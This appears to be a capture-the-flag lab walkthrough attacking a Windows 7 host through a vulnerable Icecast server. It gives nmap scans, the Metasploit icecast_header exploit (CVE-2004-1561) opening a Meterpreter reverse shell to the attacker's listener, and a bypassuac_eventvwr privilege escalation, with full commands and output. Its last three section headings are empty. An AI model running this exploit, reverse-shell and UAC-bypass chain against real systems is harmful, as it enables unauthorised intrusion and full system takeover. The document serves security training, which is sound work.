### Task 2 : Recon

#### Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine.

`nmap -sS -p- 10.10.105.232`

`nmap -sV -sC 10.10.105.232`

> Starting Nmap 7.60 ( https://nmap.org ) at 2022-08-03 21:16 BST
> 
> Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
> 
> SYN Stealth Scan Timing: About 57.62% done; ETC: 21:16 (0:00:04 remaining)
> 
> Nmap scan report for ip-10-10-105-232.eu-west-1.compute.internal (10.10.105.232)
> 
> Host is up (0.00054s latency).
> 
> Not shown: 988 closed ports
> 
> PORT      STATE SERVICE       VERSION
> 
> 135/tcp   open  msrpc         Microsoft Windows RPC
> 
> 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> 
> 445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
> 
> **3389/tcp  open  ms-wbt-server Microsoft Terminal Service**
> 
> | ssl-cert: Subject: commonName=Dark-PC
> 
> | Not valid before: 2022-08-02T20:14:54
> 
> |\_Not valid after:  2023-02-01T20:14:54
> 
> |\_ssl-date: 2022-08-03T20:18:45+00:00; 0s from scanner time.
> 
> 5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> 
> |\_http-server-header: Microsoft-HTTPAPI/2.0
> 
> |\_http-title: Service Unavailable
> 
> **8000/tcp  open  http          Icecast streaming media server**
> 
> |\_http-title: Site doesn't have a title (text/html).
> 
> 49152/tcp open  msrpc         Microsoft Windows RPC
> 
> 49153/tcp open  msrpc         Microsoft Windows RPC
> 
> 49154/tcp open  msrpc         Microsoft Windows RPC
> 
> 49158/tcp open  msrpc         Microsoft Windows RPC
> 
> 49159/tcp open  msrpc         Microsoft Windows RPC
> 
> 49160/tcp open  msrpc         Microsoft Windows RPC
> 
> MAC Address: 02:14:B9:DB:5B:39 (Unknown)
> 
> Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
>
> Host script results:
> 
> |\_nbstat: NetBIOS **name: DARK-PC**, NetBIOS user: <unknown>, NetBIOS MAC: 02:14:b9:db:5b:39 (unknown)
>   
> | smb-os-discovery: 
>   
> |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
>   
> |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
>   
> |   Computer name: Dark-PC
> 
> |   NetBIOS computer name: DARK-PC\x00
> 
> |   Workgroup: WORKGROUP\x00
> 
> |_  System time: 2022-08-03T15:18:45-05:00
> 
> | smb-security-mode: 
> 
> |   account_used: <blank>
> 
> |   authentication_level: user
> 
> |   challenge_response: supported
> 
> |_  message_signing: disabled (dangerous, but default)
> 
> | smb2-security-mode: 
> 
> |   2.02: 
> 
> |_    Message signing enabled but not required
> 
> | smb2-time: 
> 
> |   date: 2022-08-03 21:18:46
> 
> |_  start_date: 2022-08-03 21:14:36


#### One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on ?
  
> 3389/tcp  open  ms-wbt-server Microsoft Terminal Service

#### What service did nmap identify as running on port 8000 ? (First word of this service)
  
Icecast  

#### What does Nmap identify as the hostname of the machine ? (All caps for the answer)
  
DARK-PC  

### Task 3 : Gain access
  
  #### Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it ?
  
Search for Icecast on https://www.cvedetails.com
  
Try each vulnerability with a score of 7.5 or 7.4 => CVE-2004-1561

  The vulnerability type is "execute code overflow".
  
  #### What is the CVE number for this vulnerability ? This will be in the format: CVE-0000-0000
  
  CVE-2004-1561
  
  Start Metasploit.
  
  #### After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module ?

`msf5 > search icecast`

> Matching Modules
>
>   \#  Name                                 Disclosure Date  Rank   Check  Description
>  
>   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite 
  
=> exploit/windows/http/icecast_header
  
  #### What is the only required setting which currently is blank ?
  
  `msf5 > use 0`

>  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

 `msf5 exploit(windows/http/icecast_header) > show options`
  
>   Module options (exploit/windows/http/icecast_header):
> 
>    Name    Current Setting  Required  Description
>   
>    ----    ---------------  --------  -----------
>   
>    RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>   
>    RPORT   8000             yes       The target port (TCP)
> 
> Payload options (windows/meterpreter/reverse_tcp):
> 
>    Name      Current Setting  Required  Description
>   
>    ----      ---------------  --------  -----------
>   
>    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
>   
>    LHOST     10.10.203.123    yes       The listen address (an interface may be specified)
>   
>    LPORT     4444             yes       The listen port

=> RHOSTS
  
  #### Let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`.
  
  `msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.105.232`

  `msf5 exploit(windows/http/icecast_header) > exploit`

> [*] Started reverse TCP handler on 10.10.203.123:4444 
>  
> [*] Sending stage (176195 bytes) to 10.10.105.232
>  
> [*] Meterpreter session 1 opened (10.10.203.123:4444 -> 10.10.105.232:49201) at 2022-08-03 21:40:22 +0100
> 
> meterpreter > 

### Task 4 : Escalate
  
  #### We've gained a foothold into our victim machine ! What's the name of the shell we have now ?
  
  meterpreter
  
  #### What user was running that Icecast process ?
  
`meterpreter > getuid Icecast`

  > Server username: Dark-PC\Dark
  
  #### What build of Windows is the system ?
  
From NMAP output, we know it is 7601.
  
  Otherwise, using meterpreter : `sysinfo`
  
> Computer        : DARK-PC
> 
> OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
> 
> Architecture    : x64
> 
> System Language : en_US
> 
> Domain          : WORKGROUP
> 
> Logged On Users : 2
> 
> Meterpreter     : x86/windows
  
  #### What is the architecture of the process we're running ?
  
  x64
  
  #### Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`.
  
  #### Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit ?
  
  `meterpreter > run post/multi/recon/local_exploit_suggester`
  
> [*] 10.10.105.232 - Collecting local exploits for x86/windows...
>   
> [*] 10.10.105.232 - 34 exploit checks are being tried...
>   
> [+] 10.10.105.232 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
>    
> nil versions are discouraged and will be deprecated in Rubygems 4
>   
> [+] 10.10.105.232 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
>   
> [+] 10.10.105.232 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

=> exploit/windows/local/bypassuac_eventvwr
  
Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
  
  #### Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`.
  
  `meterpreter > background`
  
`Background session 1? [y/N]  y`

`use exploit/windows/local/bypassuac_eventvwr`
  
  #### Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`.
  
  `msf5 exploit(windows/local/bypassuac_eventvwr) > show options`

> Module options (exploit/windows/local/bypassuac_eventvwr):
> 
>    Name     Current Setting  Required  Description
> 
>    ----     ---------------  --------  -----------
> 
>    SESSION                   yes       The session to run this module on.
> 
> Payload options (windows/meterpreter/reverse_tcp):
> 
>    Name      Current Setting  Required  Description
> 
>    ----      ---------------  --------  -----------
> 
>    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
> 
>    LHOST     10.10.203.123    yes       The listen address (an interface may be specified)
> 
>    LPORT     4444             yes       The listen port
> 
> Exploit target:
> 
>    Id  Name
> 
>    --  ----
> 
>    0   Windows x86

`SET SESSION 1`
  
#### Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option ?

    `msf5 exploit(windows/local/bypassuac_eventvwr) > show options`
  
  => LHOST

  #### Set this option now.
  
  `msf5 exploit(windows/local/bypassuac_eventvwr) > set LHOST REPLACE_WITH_ATTACK_BOX_IP`
  
  #### After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. 
  
  `msf5 exploit(windows/local/bypassuac_eventvwr) > run`

> [*] Started reverse TCP handler on 10.10.203.123:4444 
> 
> [*] UAC is Enabled, checking level...
> 
> [+] Part of Administrators group! Continuing...
> 
> [+] UAC is set to Default
> 
> [+] BypassUAC can bypass this setting, continuing...
> 
> [*] Configuring payload and stager registry keys ...
> 
> [*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
> 
> [+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
> 
> [*] Sending stage (176195 bytes) to 10.10.105.232
> 
> [*] Meterpreter session 2 opened (10.10.203.123:4444 -> 10.10.105.232:49216) at 2022-08-03 21:52:14 +0100
> 
> [*] Cleaning up registry keys ...
  
  #### Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`.
  
  `sessions 2`
  
  #### We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files ?
  
  `meterpreter > getprivs`

> Enabled Process Privileges
> 
> ==========================
> 
> Name
> 
> ----
> 
> SeBackupPrivilege
> 
> SeChangeNotifyPrivilege
> 
> SeCreateGlobalPrivilege
> 
> SeCreatePagefilePrivilege
> 
> SeCreateSymbolicLinkPrivilege
> 
> SeDebugPrivilege
> 
> SeImpersonatePrivilege
> 
> SeIncreaseBasePriorityPrivilege
> 
> SeIncreaseQuotaPrivilege
> 
> SeIncreaseWorkingSetPrivilege
> 
> SeLoadDriverPrivilege
> 
> SeManageVolumePrivilege
> 
> SeProfileSingleProcessPrivilege
> 
> SeRemoteShutdownPrivilege
> 
> SeRestorePrivilege
> 
> SeSecurityPrivilege
> 
> SeShutdownPrivilege
> 
> SeSystemEnvironmentPrivilege
> 
> SeSystemProfilePrivilege
> 
> SeSystemtimePrivilege
> 
> SeTakeOwnershipPrivilege
> 
> SeTimeZonePrivilege
> SeUndockPrivilege

=> SeTakeOwnershipPrivilege

### Task 5 : Looting

### Task 6 : Post-exploitation

### Task 7 : Extra credit
